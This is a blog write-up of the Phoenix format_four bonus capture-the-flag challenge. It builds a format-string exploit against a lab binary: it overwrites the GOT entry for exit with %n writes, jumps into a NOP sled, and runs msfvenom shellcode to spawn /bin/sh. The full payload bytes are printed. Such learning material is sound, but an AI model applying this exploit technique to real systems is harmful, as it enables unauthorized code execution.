---
title: Phoenix - format_four bonus
date: 2026-06-20 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix format_four ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge format_four bonus section from the series Phoenix found at <https://exploit.education/phoenix/format-four/>


## Step one - determining __exit__ address 
As this challenge involves overwriting the GOT address of the __exit__ function, i will have to first determine where it is located. Run the commands `objdump -R <filename> ` and `(gdb) info proc mapping`.

![](assets/posts/PWN/phoenix_format_four_bonus/exit_addr.png)

The output of `objdump` tells me where the function __exit__ is located. In this case it is located at offset `0x00004010`.

![](assets/posts/PWN/phoenix_format_four_bonus/procmap.png)

The output of `(gdb) info proc mapping` tells me the base address to calculate from to find the actual address of __exit__. This means __exit__ is loaded at `0x56559010`. Hence my payload will start in the following manner:

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"\x11\x90\x55\x56"
changeme += b"\x12\x90\x55\x56"
changeme += b"\x13\x90\x55\x56"
```

## Step two - generating the payload
To generate the shell code to run `/bin/sh`, i used msfvenom for it by running `msfvenom -p linux/x86/exec  -f python -b '\x00'`. This removes the null bytes which will interfere with the payload. I also added a NOP slide before the actual shell code. Now, my payload looks like this:

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"\x11\x90\x55\x56"
changeme += b"\x12\x90\x55\x56"
changeme += b"\x13\x90\x55\x56"

#shell code

changeme += b"\x90" * 200
changeme  +=  b""
changeme += b"\xb8\xca\x3c\x9d\x98\xda\xc4\xd9\x74\x24\xf4\x5a"
changeme += b"\x31\xc9\xb1\x06\x83\xea\xfc\x31\x42\x0e\x03\x88"
changeme += b"\x32\x7f\x6d\x3d\x82\x88\x6f\x8d\x1f\x1f\x5f\x9e"
changeme += b"\x77\xdf\xf7\x4f\xea\xb6\x69\x06\x09\x85\xf6"
```


## Step three - determine where input is located
I need to know the offset of where my input is located on the stack. To find out, place a breakpoint right before __printf__ is called. 

![](assets/posts/PWN/phoenix_format_four_bonus/stack.png)

Based on the image above, it is located at an offset of 11 bytes. Hence i will add `%x` 11 times in my payload. Afterwards i will add `%n` to write to `0x56559010` which allows me to check how many bytes are counted so far. 

![](assets/posts/PWN/phoenix_format_four_bonus/initbytes.png)

Based on the image above, there are `0x14c` bytes written so far. 

## Step four - determining where to go 
Now, it is just a matter of determining where on the stack i the code execution to go to. Based on my stack, i would want it to be somewhere in the middle of my NOP sled. This increases the chances of it successfully executing the shell code to run `/bin/sh`. After determining the address i would want code execution to go to, i used the same method earlier on to write the address to `0x56559010`. My payload currently looks like this:

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"\x11\x90\x55\x56"
changeme += b"\x12\x90\x55\x56"
changeme += b"\x13\x90\x55\x56"

#shell code

changeme += b"\x90" * 200
changeme  +=  b""
changeme += b"\xb8\xca\x3c\x9d\x98\xda\xc4\xd9\x74\x24\xf4\x5a"
changeme += b"\x31\xc9\xb1\x06\x83\xea\xfc\x31\x42\x0e\x03\x88"
changeme += b"\x32\x7f\x6d\x3d\x82\x88\x6f\x8d\x1f\x1f\x5f\x9e"
changeme += b"\x77\xdf\xf7\x4f\xea\xb6\x69\x06\x09\x85\xf6"

# determine init bytes
changeme += b"%x" * 11
#changeme += b"%n" #write here to check no. of bytes so far

changeme += b" " * 4
changeme += b"%n"

changeme += b" " * 117
changeme += b"%n"

changeme += b" " * 58
changeme += b"%n"

changeme += b" " * 256
changeme += b"%n"

sys.stdout.buffer.write(changeme)
```


## Step five - Running /bin/sh 
When i ran my payload, it did run `/bin/sh` but it terminated immediately as shown below.

![](assets/posts/PWN/phoenix_format_four_bonus/shellpoc.png)

In order to prevent the shell from terminating run it in gdb with `run < <(cat <payload>; cat)`. This gets the output from the payload and inputs into the binary. Afterwards the second `cat` forces the shell to wait for an user inpt, thus preventing the `/bin/sh` from terminating. 

![](assets/posts/PWN/phoenix_format_four_bonus/shellfinal.png)










